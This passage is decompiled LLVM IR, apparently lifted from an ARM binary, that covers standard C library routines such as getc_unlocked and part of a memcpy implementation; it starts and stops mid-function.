  store i32 92792, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16a6c)
  %v0_16a78 = load i32, i32* @r5, align 4
  %v1_16a78 = add i32 %v0_16a78, 16
  %v2_16a78 = inttoptr i32 %v1_16a78 to i32*
  %v3_16a78 = load i32, i32* %v2_16a78, align 4
  %v1_16a7c = add i32 %v0_16a78, 24
  %v2_16a7c = inttoptr i32 %v1_16a7c to i32*
  %v3_16a7c = load i32, i32* %v2_16a7c, align 4
  %v3_16a80 = icmp ult i32 %v3_16a78, %v3_16a7c
  br i1 %v3_16a80, label %.thread2, label %dec_label_pc_16a90

.thread2:                                         ; preds = %dec_label_pc_16a40
  %v2_16a84 = inttoptr i32 %v3_16a78 to i8*
  %v3_16a84 = load i8, i8* %v2_16a84, align 1
  %v4_16a84 = zext i8 %v3_16a84 to i32
  store i32 %v4_16a84, i32* %r4.global-to-local, align 4
  %v6_16a84 = add i32 %v3_16a78, 1
  store i32 %v6_16a84, i32* %v2_16a78, align 4
  br label %dec_label_pc_16a9c

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a40
  %v1_16a94 = inttoptr i32 %v0_16a78 to i16*
  %v2_16a94 = call i32 @getc_unlocked(i16* %v1_16a94)
  store i32 %v2_16a94, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16a9c

dec_label_pc_16a9c:                               ; preds = %.thread2, %dec_label_pc_16a90
  %v0_16aa8 = load i32, i32* %r6.global-to-local, align 4
  %v2_16aa8 = add i32 %v0_16aa8, 24
  %v3_16aa8 = inttoptr i32 %v2_16aa8 to i32*
  %v4_16aa8 = load i32, i32* %v3_16aa8, align 4
  store i32 %v4_16aa8, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_16aa8)
  br label %dec_label_pc_16ab4

dec_label_pc_16ab4:                               ; preds = %.thread, %dec_label_pc_16a34, %dec_label_pc_16a9c
  %v0_16ab4 = load i32, i32* %r4.global-to-local, align 4
  %v2_16abc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16abc, i32* @r4, align 4
  store i32 %v6_169fc, i32* @r5, align 4
  store i32 %v12_169fc, i32* @lr, align 4
  ret i32 %v0_16ab4

; uselistorder directives
  uselistorder i32 %v3_16a78, { 1, 0, 2 }
  uselistorder i32 %v3_16a1c, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 2, 5, 4, 0, 3 }
  uselistorder label %dec_label_pc_16ab4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a9c, { 1, 0 }
}

define i32 @function_16ac8(i32 %arg1) local_unnamed_addr {
dec_label_pc_16ac8:
  %v0_16ac8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16ac8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_16ac8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16ac8, %bb
  %v10_16ad4 = phi i32 [ %arg1, %dec_label_pc_16ac8 ], [ 0, %bb ]
  ret i32 %v10_16ad4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_16ad8 = load i32, i32* @r4, align 4
  store i32 %v3_16ad8, i32* %stack_var_-12, align 4
  %v6_16ad8 = load i32, i32* @r5, align 4
  %v9_16ad8 = load i32, i32* @lr, align 4
  %v0_16adc = load i32, i32* @r0, align 4
  %v1_16adc = add i32 %v0_16adc, 16
  %v2_16adc = inttoptr i32 %v1_16adc to i32*
  %v3_16adc = load i32, i32* %v2_16adc, align 4
  store i32 %v3_16adc, i32* %r2.global-to-local, align 4
  %v1_16ae0 = add i32 %v0_16adc, 24
  %v2_16ae0 = inttoptr i32 %v1_16ae0 to i32*
  %v3_16ae0 = load i32, i32* %v2_16ae0, align 4
  %v3_16ae4 = icmp ult i32 %v3_16adc, %v3_16ae0
  store i32 %v0_16adc, i32* @r4, align 4
  br i1 %v3_16ae4, label %bb, label %dec_label_pc_16b04

bb:                                               ; preds = %entry
  %v2_16af0 = inttoptr i32 %v3_16adc to i8*
  %v3_16af0 = load i8, i8* %v2_16af0, align 1
  %v4_16af0 = zext i8 %v3_16af0 to i32
  store i32 %v4_16af0, i32* %r0.global-to-local, align 4
  %v6_16af0 = add i32 %v3_16adc, 1
  store i32 %v6_16af0, i32* %r2.global-to-local, align 4
  store i32 %v6_16af0, i32* %v2_16adc, align 4
  br label %dec_label_pc_16bf0

dec_label_pc_16b04:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r5, align 4
  %v1_16b04 = inttoptr i32 %v0_16adc to i16*
  %v2_16b04 = load i16, i16* %v1_16b04, align 2
  %v3_16b04 = zext i16 %v2_16b04 to i32
  %v1_16b08 = and i32 %v3_16b04, 131
  %tmp25 = icmp ugt i32 %v1_16b08, 128
  br i1 %tmp25, label %dec_label_pc_16b24, label %dec_label_pc_16b14

dec_label_pc_16b14:                               ; preds = %dec_label_pc_16b04
  store i32 128, i32* @r1, align 4
  %v0_16b18 = call i32 @__stdio_trans2r_o()
  store i32 %v0_16b18, i32* %r0.global-to-local, align 4
  %v2_16b1c = icmp eq i32 %v0_16b18, 0
  br i1 %v2_16b1c, label %dec_label_pc_16b14.dec_label_pc_16b24_crit_edge, label %dec_label_pc_16bec

dec_label_pc_16b14.dec_label_pc_16b24_crit_edge:  ; preds = %dec_label_pc_16b14
  %v0_16b24.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16b24

dec_label_pc_16b24:                               ; preds = %dec_label_pc_16b14.dec_label_pc_16b24_crit_edge, %dec_label_pc_16b04
  %v2_16b64 = phi i32 [ %v0_16b24.pre, %dec_label_pc_16b14.dec_label_pc_16b24_crit_edge ], [ %v0_16adc, %dec_label_pc_16b04 ]
  %v1_16b24 = inttoptr i32 %v2_16b64 to i16*
  %v2_16b24 = load i16, i16* %v1_16b24, align 2
  %v3_16b24 = zext i16 %v2_16b24 to i32
  store i32 %v3_16b24, i32* %r2.global-to-local, align 4
  %v1_16b28 = and i32 %v3_16b24, 2
  %v2_16b28 = icmp eq i32 %v1_16b28, 0
  br i1 %v2_16b28, label %dec_label_pc_16b54, label %dec_label_pc_16b30

dec_label_pc_16b30:                               ; preds = %dec_label_pc_16b24
  %tmp26 = urem i16 %v2_16b24, 2
  %v1_16b30 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_16b30
  %v4_16b34 = and i32 %tmp22, 4
  %v5_16b34 = add i32 %v4_16b34, %v2_16b64
  %v1_16b38 = add i32 %v5_16b34, 36
  %v2_16b38 = inttoptr i32 %v1_16b38 to i8*
  %v3_16b38 = load i8, i8* %v2_16b38, align 1
  %v4_16b38 = zext i8 %v3_16b38 to i32
  %v1_16b3c = add nsw i32 %v3_16b24, -1
  store i32 %v1_16b3c, i32* %r2.global-to-local, align 4
  store i32 %v4_16b38, i32* %r0.global-to-local, align 4
  %v2_16b48 = add i32 %v2_16b64, 40
  %v3_16b48 = inttoptr i32 %v2_16b48 to i32*
  store i32 0, i32* %v3_16b48, align 4
  %v0_16b4c = load i32, i32* %r2.global-to-local, align 4
  %v1_16b4c = trunc i32 %v0_16b4c to i16
  %v2_16b4c = load i32, i32* @r4, align 4
  %v3_16b4c = inttoptr i32 %v2_16b4c to i16*
  store i16 %v1_16b4c, i16* %v3_16b4c, align 2
  br label %dec_label_pc_16bf0

dec_label_pc_16b54:                               ; preds = %dec_label_pc_16b24
  %v1_16b54 = add i32 %v2_16b64, 16
  %v1_16b58 = inttoptr i32 %v1_16b54 to i32*
  %v2_16b58 = load i32, i32* %v1_16b58, align 4
  %v3_16b58 = add i32 %v2_16b64, 20
  %v4_16b58 = inttoptr i32 %v3_16b58 to i32*
  %v5_16b58 = load i32, i32* %v4_16b58, align 4
  %v9_16b5c = icmp eq i32 %v5_16b58, %v2_16b58
  br i1 %v9_16b5c, label %dec_label_pc_16b6c, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16b54
  %v2_16b60 = inttoptr i32 %v2_16b58 to i8*
  %v3_16b60 = load i8, i8* %v2_16b60, align 1
  %v4_16b60 = zext i8 %v3_16b60 to i32
  store i32 %v4_16b60, i32* %r0.global-to-local, align 4
  %v6_16b60 = add i32 %v2_16b58, 1
  store i32 %v6_16b60, i32* %v1_16b58, align 4
  br label %dec_label_pc_16bf0

dec_label_pc_16b6c:                               ; preds = %dec_label_pc_16b54
  %v1_16b6c = add i32 %v2_16b64, 4
  %v2_16b6c = inttoptr i32 %v1_16b6c to i32*
  %v3_16b6c = load i32, i32* %v2_16b6c, align 4
  %v7_16b70 = icmp eq i32 %v3_16b6c, -2
  br i1 %v7_16b70, label %.thread7, label %dec_label_pc_16b84

.thread7:                                         ; preds = %dec_label_pc_16b6c
  %v2_16b74 = or i16 %v2_16b24, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_16b74, i16* %v1_16b24, align 2
  br label %dec_label_pc_16bf0

dec_label_pc_16b84:                               ; preds = %dec_label_pc_16b6c
  %v1_16b84 = and i32 %v3_16b24, 768
  %v2_16b84 = icmp eq i32 %v1_16b84, 0
  br i1 %v2_16b84, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_16b84
  %v1_16b8c = load i32, i32* @r5, align 4
  %v3_16b8c = add i32 %v1_16b8c, 48
  %v4_16b8c = inttoptr i32 %v3_16b8c to i32*
  %v5_16b8c = load i32, i32* %v4_16b8c, align 4
  store i32 %v5_16b8c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16b84, %bb23
  %v1_16b90 = xor i1 %v2_16b84, true
  call void @__pseudo_cond_branch(i1 %v1_16b90, i32 ptrtoint (i32* @global_var_11724.594 to i32))
  %v0_16b94 = load i32, i32* @r4, align 4
  %v1_16b94 = add i32 %v0_16b94, 8
  store i32 %v1_16b94, i32* %r2.global-to-local, align 4
  %v1_16b98 = inttoptr i32 %v1_16b94 to i32*
  %v2_16b98 = load i32, i32* %v1_16b98, align 4
  store i32 %v2_16b98, i32* %r2.global-to-local, align 4
  %v3_16b98 = add i32 %v0_16b94, 12
  %v4_16b98 = inttoptr i32 %v3_16b98 to i32*
  %v5_16b98 = load i32, i32* %v4_16b98, align 4
  %v9_16b9c = icmp eq i32 %v5_16b98, %v2_16b98
  br i1 %v9_16b9c, label %dec_label_pc_16bd0, label %dec_label_pc_16ba4

dec_label_pc_16ba4:                               ; preds = %.thread9
  %v2_16ba4 = add i32 %v0_16b94, 24
  %v3_16ba4 = inttoptr i32 %v2_16ba4 to i32*
  store i32 %v2_16b98, i32* %v3_16ba4, align 4
  %v0_16ba8 = load i32, i32* @r4, align 4
  store i32 %v0_16ba8, i32* %r0.global-to-local, align 4
  %v2_16bac = call i32 @__stdio_rfill(i32 %v0_16ba8)
  store i32 %v2_16bac, i32* %r0.global-to-local, align 4
  %v2_16bb0 = icmp eq i32 %v2_16bac, 0
  br i1 %v2_16bb0, label %dec_label_pc_16bec, label %dec_label_pc_16bb8

dec_label_pc_16bb8:                               ; preds = %dec_label_pc_16ba4
  %v0_16bb8 = load i32, i32* @r4, align 4
  %v1_16bb8 = add i32 %v0_16bb8, 20
  %v2_16bb8 = inttoptr i32 %v1_16bb8 to i32*
  %v3_16bb8 = load i32, i32* %v2_16bb8, align 4
  %v2_16bbc = add i32 %v0_16bb8, 24
  %v3_16bbc = inttoptr i32 %v2_16bbc to i32*
  store i32 %v3_16bb8, i32* %v3_16bbc, align 4
  %v0_16bc0 = load i32, i32* @r4, align 4
  %v1_16bc0 = add i32 %v0_16bc0, 16
  %v2_16bc0 = inttoptr i32 %v1_16bc0 to i32*
  %v3_16bc0 = load i32, i32* %v2_16bc0, align 4
  %v1_16bc4 = inttoptr i32 %v3_16bc0 to i8*
  %v2_16bc4 = load i8, i8* %v1_16bc4, align 1
  %v3_16bc4 = zext i8 %v2_16bc4 to i32
  store i32 %v3_16bc4, i32* %r0.global-to-local, align 4
  %v5_16bc4 = add i32 %v3_16bc0, 1
  store i32 %v5_16bc4, i32* %v2_16bc0, align 4
  br label %dec_label_pc_16bf0

dec_label_pc_16bd0:                               ; preds = %.thread9
  %v1_16bd0 = inttoptr i32 %v0_16b94 to i16*
  store i32 %v0_16b94, i32* %r0.global-to-local, align 4
  %v2_16bd4 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_16bdc = call i32 @__stdio_READ(i16* %v1_16bd0, i32 %v2_16bd4, i32 1)
  store i32 %v5_16bdc, i32* %r0.global-to-local, align 4
  %v2_16be0 = icmp eq i32 %v5_16bdc, 0
  br i1 %v2_16be0, label %dec_label_pc_16bec, label %bb24

bb24:                                             ; preds = %dec_label_pc_16bd0
  %v4_16be4 = load i8, i8* %stack_var_-17, align 1
  %v5_16be4 = sext i8 %v4_16be4 to i32
  store i32 %v5_16be4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16bf0

dec_label_pc_16bec:                               ; preds = %dec_label_pc_16bd0, %dec_label_pc_16b14, %dec_label_pc_16ba4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16bf0

dec_label_pc_16bf0:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_16bb8, %dec_label_pc_16b30, %dec_label_pc_16bec
  %v2_16bf4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16bf4, i32* @r4, align 4
  store i32 %v6_16ad8, i32* @r5, align 4
  store i32 %v9_16ad8, i32* @lr, align 4
  %v1_16bf8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16bf8

; uselistorder directives
  uselistorder i32 %v2_16b58, { 1, 0, 2 }
  uselistorder i32 %v2_16b64, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_16adc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder label %dec_label_pc_16bf0, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_16bec, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_16c10 = load i32, i32* %r1.global-to-local, align 4
  %v1_16c10 = load i32, i32* %r0.global-to-local, align 4
  %v2_16c10 = sub i32 %v0_16c10, %v1_16c10
  %v3_16c10 = icmp ult i32 %v0_16c10, %v1_16c10
  %v4_16c10 = xor i32 %v1_16c10, %v0_16c10
  %v5_16c10 = xor i32 %v2_16c10, %v0_16c10
  %v6_16c10 = and i32 %v5_16c10, %v4_16c10
  %v7_16c10 = icmp slt i32 %v6_16c10, 0
  store i1 %v7_16c10, i1* %cpsr_v.global-to-local, align 1
  %v8_16c10 = icmp slt i32 %v2_16c10, 0
  store i1 %v8_16c10, i1* %cpsr_n.global-to-local, align 1
  %v9_16c10 = icmp eq i32 %v0_16c10, %v1_16c10
  store i1 %v9_16c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16c10, label %dec_label_pc_16e64, label %dec_label_pc_16c18

dec_label_pc_16c18:                               ; preds = %entry
  br i1 %v9_16c10, label %.thread130, label %bb

.thread130:                                       ; preds = %bb154, %.thread129, %bb151, %dec_label_pc_16c18
  %merge = phi i32 [ %v0_16c10, %dec_label_pc_16c18 ], [ %v2_16ef8, %bb151 ], [ %v11_16f14, %bb154 ], [ %v7_16f14, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_16c18
  %v5_16c1c = inttoptr i32 %v1_16c10 to i8*
  store i8* %v5_16c1c, i8** %stack_var_-8, align 4
  %v8_16c1c = load i32, i32* @lr, align 4
  %v0_16c20 = load i32, i32* @r2, align 4
  %v2_16c20 = add i32 %v0_16c20, -4
  store i32 %v2_16c20, i32* %r2.global-to-local, align 4
  %v4_16c20 = sub i32 3, %v0_16c20
  %v5_16c20 = and i32 %v4_16c20, %v0_16c20
  %v6_16c20 = icmp slt i32 %v5_16c20, 0
  store i1 %v6_16c20, i1* %cpsr_v.global-to-local, align 1
  %v7_16c20 = icmp slt i32 %v2_16c20, 0
  store i1 %v7_16c20, i1* %cpsr_n.global-to-local, align 1
  %v8_16c20 = icmp eq i32 %v0_16c20, 4
  store i1 %v8_16c20, i1* %cpsr_z.global-to-local, align 1
  %v5_16c24 = icmp slt i32 %v0_16c20, 4
  br i1 %v5_16c24, label %bb141, label %dec_label_pc_16c28

dec_label_pc_16c28:                               ; preds = %bb
  %v1_16c28 = urem i32 %v1_16c10, 4
  store i32 %v1_16c28, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16c28 = icmp eq i32 %v1_16c28, 0
  store i1 %v2_16c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16c28, label %dec_label_pc_16c30, label %dec_label_pc_16cdc

dec_label_pc_16c30:                               ; preds = %dec_label_pc_16c28
  %v1_16c30 = urem i32 %v0_16c10, 4
  store i32 %v1_16c30, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16c30 = icmp eq i32 %v1_16c30, 0
  store i1 %v2_16c30, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_16c10 to i2
  br i1 %v2_16c30, label %dec_label_pc_16c38, label %dec_label_pc_16d0c

dec_label_pc_16c38:                               ; preds = %dec_label_pc_16c30, %dec_label_pc_16d04
  %v0_16c5094 = phi i32 [ %v1_16c10, %dec_label_pc_16c30 ], [ %v0_16e2c77, %dec_label_pc_16d04 ]
  %v0_16c4c93 = phi i32 [ %v0_16c10, %dec_label_pc_16c30 ], [ %v0_16d04, %dec_label_pc_16d04 ]
  %v0_16c38 = phi i32 [ %v2_16c20, %dec_label_pc_16c30 ], [ %v2_16cfc, %dec_label_pc_16d04 ]
  %v1_16c38 = add i32 %v0_16c38, -8
  store i32 %v1_16c38, i32* %r2.global-to-local, align 4
  %v3_16c38 = sub i32 7, %v0_16c38
  %v4_16c38 = and i32 %v3_16c38, %v0_16c38
  %v5_16c38 = icmp slt i32 %v4_16c38, 0
  store i1 %v5_16c38, i1* %cpsr_v.global-to-local, align 1
  %v6_16c38 = icmp slt i32 %v1_16c38, 0
  store i1 %v6_16c38, i1* %cpsr_n.global-to-local, align 1
  %v7_16c38 = icmp eq i32 %v0_16c38, 8
  store i1 %v7_16c38, i1* %cpsr_z.global-to-local, align 1
  %v2_16c3c = xor i1 %v6_16c38, %v5_16c38
  br i1 %v2_16c3c, label %dec_label_pc_16c8c, label %dec_label_pc_16c40

dec_label_pc_16c40:                               ; preds = %dec_label_pc_16c38
  %v1_16c40 = add i32 %v0_16c38, -28
  store i32 %v1_16c40, i32* %r2.global-to-local, align 4
  %v3_16c40 = sub i32 27, %v0_16c38
  %v4_16c40 = and i32 %v3_16c40, %v1_16c38
  %v5_16c40 = icmp slt i32 %v4_16c40, 0
  store i1 %v5_16c40, i1* %cpsr_v.global-to-local, align 1
  %v6_16c40 = icmp slt i32 %v1_16c40, 0
  store i1 %v6_16c40, i1* %cpsr_n.global-to-local, align 1
  %v7_16c40 = icmp eq i32 %v1_16c38, 20
  store i1 %v7_16c40, i1* %cpsr_z.global-to-local, align 1
  %v2_16c44 = xor i1 %v6_16c40, %v5_16c40
  br i1 %v2_16c44, label %dec_label_pc_16c78, label %dec_label_pc_16c48

dec_label_pc_16c48:                               ; preds = %dec_label_pc_16c40
  %v0_16c48 = load i32, i32* @r4, align 4
  store i32 %v0_16c48, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16c4c.dec_label_pc_16c4c_crit_edge, %dec_label_pc_16c48
  %v0_16c50 = phi i32 [ %v12_16c58, %dec_label_pc_16c4c.dec_label_pc_16c4c_crit_edge ], [ %v0_16c5094, %dec_label_pc_16c48 ]
  %v0_16c4c = phi i32 [ %v0_16c4c.pre, %dec_label_pc_16c4c.dec_label_pc_16c4c_crit_edge ], [ %v0_16c4c93, %dec_label_pc_16c48 ]
  %v1_16c4c = inttoptr i32 %v0_16c4c to i32*
  %v2_16c4c = load i32, i32* %v1_16c4c, align 4
  %v3_16c4c = add i32 %v0_16c4c, 4
  %v4_16c4c = inttoptr i32 %v3_16c4c to i32*
  %v5_16c4c = load i32, i32* %v4_16c4c, align 4
  store i32 %v5_16c4c, i32* %r4.global-to-local, align 4
  %v6_16c4c = add i32 %v0_16c4c, 8
  %v7_16c4c = inttoptr i32 %v6_16c4c to i32*
  %v8_16c4c = load i32, i32* %v7_16c4c, align 4
  store i32 %v8_16c4c, i32* %ip.global-to-local, align 4
  %v9_16c4c = add i32 %v0_16c4c, 12
  %v10_16c4c = inttoptr i32 %v9_16c4c to i32*
  %v11_16c4c = load i32, i32* %v10_16c4c, align 4
  store i32 %v11_16c4c, i32* %lr.global-to-local, align 4
  %v12_16c4c = add i32 %v0_16c4c, 16
  store i32 %v12_16c4c, i32* %r1.global-to-local, align 4
  %v1_16c50 = inttoptr i32 %v0_16c50 to i32*
  store i32 %v2_16c4c, i32* %v1_16c50, align 4
  %v3_16c50 = add i32 %v0_16c50, 4
  %v4_16c50 = inttoptr i32 %v3_16c50 to i32*
  %v5_16c50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16c50, i32* %v4_16c50, align 4
  %v6_16c50 = add i32 %v0_16c50, 8
  %v7_16c50 = inttoptr i32 %v6_16c50 to i32*
  %v8_16c50 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_16c50, i32* %v7_16c50, align 4
  %v9_16c50 = add i32 %v0_16c50, 12
  %v10_16c50 = inttoptr i32 %v9_16c50 to i32*
  %v11_16c50 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16c50, i32* %v10_16c50, align 4
  %v12_16c50 = add i32 %v0_16c50, 16
  store i32 %v12_16c50, i32* %r0.global-to-local, align 4
  %v0_16c54 = load i32, i32* %r1.global-to-local, align 4
  %v1_16c54 = inttoptr i32 %v0_16c54 to i32*
  %v2_16c54 = load i32, i32* %v1_16c54, align 4
  store i32 %v2_16c54, i32* @r3, align 4
  %v3_16c54 = add i32 %v0_16c54, 4
  %v4_16c54 = inttoptr i32 %v3_16c54 to i32*
  %v5_16c54 = load i32, i32* %v4_16c54, align 4
  store i32 %v5_16c54, i32* %r4.global-to-local, align 4
  %v6_16c54 = add i32 %v0_16c54, 8
  %v7_16c54 = inttoptr i32 %v6_16c54 to i32*
  %v8_16c54 = load i32, i32* %v7_16c54, align 4
  store i32 %v8_16c54, i32* @ip, align 4
  %v9_16c54 = add i32 %v0_16c54, 12
  %v10_16c54 = inttoptr i32 %v9_16c54 to i32*
  %v11_16c54 = load i32, i32* %v10_16c54, align 4
  store i32 %v11_16c54, i32* %lr.global-to-local, align 4
  %v12_16c54 = add i32 %v0_16c54, 16
  store i32 %v12_16c54, i32* %r1.global-to-local, align 4
  %v1_16c58 = inttoptr i32 %v12_16c50 to i32*
  store i32 %v2_16c54, i32* %v1_16c58, align 4
  %v3_16c58 = add i32 %v0_16c50, 20
  %v4_16c58 = inttoptr i32 %v3_16c58 to i32*
  %v5_16c58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16c58, i32* %v4_16c58, align 4
  %v6_16c58 = add i32 %v0_16c50, 24
  %v7_16c58 = inttoptr i32 %v6_16c58 to i32*
  %v8_16c58 = load i32, i32* @ip, align 4
  store i32 %v8_16c58, i32* %v7_16c58, align 4
  %v9_16c58 = add i32 %v0_16c50, 28
  %v10_16c58 = inttoptr i32 %v9_16c58 to i32*
  %v11_16c58 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16c58, i32* %v10_16c58, align 4
  %v12_16c58 = add i32 %v0_16c50, 32
  store i32 %v12_16c58, i32* %r0.global-to-local, align 4
  %v0_16c5c = load i32, i32* %r2.global-to-local, align 4
  %v1_16c5c = add i32 %v0_16c5c, -32
  store i32 %v1_16c5c, i32* %r2.global-to-local, align 4
  %v3_16c5c = sub i32 31, %v0_16c5c
  %v4_16c5c = and i32 %v3_16c5c, %v0_16c5c
  %v5_16c5c = icmp slt i32 %v4_16c5c, 0
  %v6_16c5c = icmp slt i32 %v1_16c5c, 0
  %v2_16c60 = xor i1 %v6_16c5c, %v5_16c5c
  br i1 %v2_16c60, label %dec_label_pc_16c64, label %dec_label_pc_16c4c.dec_label_pc_16c4c_crit_edge

dec_label_pc_16c4c.dec_label_pc_16c4c_crit_edge:  ; preds = %dec_label_pc_16c4c
  %v0_16c4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c4c

dec_label_pc_16c64:                               ; preds = %dec_label_pc_16c4c
  %v1_16c64 = add i32 %v0_16c5c, -16
  %v3_16c64 = add i32 %v0_16c5c, 2147483616
  %v4_16c64 = and i32 %v1_16c64, %v3_16c64
  %v5_16c64 = icmp slt i32 %v4_16c64, 0
  store i1 %v5_16c64, i1* %cpsr_v.global-to-local, align 1
  %v6_16c64 = icmp slt i32 %v1_16c64, 0
  store i1 %v6_16c64, i1* %cpsr_n.global-to-local, align 1
  %v7_16c64 = icmp eq i32 %v1_16c64, 0
  store i1 %v7_16c64, i1* %cpsr_z.global-to-local, align 1
  %v2_16c68 = xor i1 %v6_16c64, %v5_16c64
  br i1 %v2_16c68, label %bb138, label %bb137

bb137:                                            ; preds = %dec_label_pc_16c64
  %v3_16c68 = load i32, i32* %r1.global-to-local, align 4
  %v4_16c68 = inttoptr i32 %v3_16c68 to i32*
  %v5_16c68 = load i32, i32* %v4_16c68, align 4
  store i32 %v5_16c68, i32* @r3, align 4
  %v6_16c68 = add i32 %v3_16c68, 4
  %v7_16c68 = inttoptr i32 %v6_16c68 to i32*
  %v8_16c68 = load i32, i32* %v7_16c68, align 4
  store i32 %v8_16c68, i32* %r4.global-to-local, align 4
  %v9_16c68 = add i32 %v3_16c68, 8
  %v10_16c68 = inttoptr i32 %v9_16c68 to i32*
  %v11_16c68 = load i32, i32* %v10_16c68, align 4
  store i32 %v11_16c68, i32* @ip, align 4
  %v12_16c68 = add i32 %v3_16c68, 12
  %v13_16c68 = inttoptr i32 %v12_16c68 to i32*
  %v14_16c68 = load i32, i32* %v13_16c68, align 4
  store i32 %v14_16c68, i32* %lr.global-to-local, align 4
  %v15_16c68 = add i32 %v3_16c68, 16
  store i32 %v15_16c68, i32* %r1.global-to-local, align 4
  %v4_16c6c = inttoptr i32 %v12_16c58 to i32*
  store i32 %v5_16c68, i32* %v4_16c6c, align 4
  %v6_16c6c = add i32 %v0_16c50, 36
  %v7_16c6c = inttoptr i32 %v6_16c6c to i32*
  %v8_16c6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_16c6c, i32* %v7_16c6c, align 4
  %v9_16c6c = add i32 %v0_16c50, 40
  %v10_16c6c = inttoptr i32 %v9_16c6c to i32*
  %v11_16c6c = load i32, i32* @ip, align 4
  store i32 %v11_16c6c, i32* %v10_16c6c, align 4
  %v12_16c6c = add i32 %v0_16c50, 44
  %v13_16c6c = inttoptr i32 %v12_16c6c to i32*
  %v14_16c6c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_16c6c, i32* %v13_16c6c, align 4
  %v15_16c6c = add i32 %v0_16c50, 48
  store i32 %v15_16c6c, i32* %r0.global-to-local, align 4
  %v3_16c70 = load i32, i32* %r2.global-to-local, align 4
  %v4_16c70 = add i32 %v3_16c70, -16
  store i32 %v4_16c70, i32* %r2.global-to-local, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_16c64, %bb137
  %v3_16c80102111 = phi i32 [ %v15_16c6c, %bb137 ], [ %v12_16c58, %dec_label_pc_16c64 ]
  %v0_16c78.pre = phi i32 [ %v4_16c70, %bb137 ], [ %v1_16c5c, %dec_label_pc_16c64 ]
  %v2_16c74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16c74, i32* @r4, align 4
  br label %dec_label_pc_16c78

dec_label_pc_16c78:                               ; preds = %dec_label_pc_16c40, %bb138
  %v3_16c80101 = phi i32 [ %v0_16c5094, %dec_label_pc_16c40 ], [ %v3_16c80102111, %bb138 ]
  %v0_16c78 = phi i32 [ %v1_16c40, %dec_label_pc_16c40 ], [ %v0_16c78.pre, %bb138 ]
  %v1_16c78 = add i32 %v0_16c78, 20
  store i32 %v1_16c78, i32* %r2.global-to-local, align 4
  %v3_16c78 = sub i32 0, %v0_16c78
  %v4_16c78 = and i32 %v1_16c78, %v3_16c78
  %v5_16c78 = icmp slt i32 %v4_16c78, 0
  store i1 %v5_16c78, i1* %cpsr_v.global-to-local, align 1
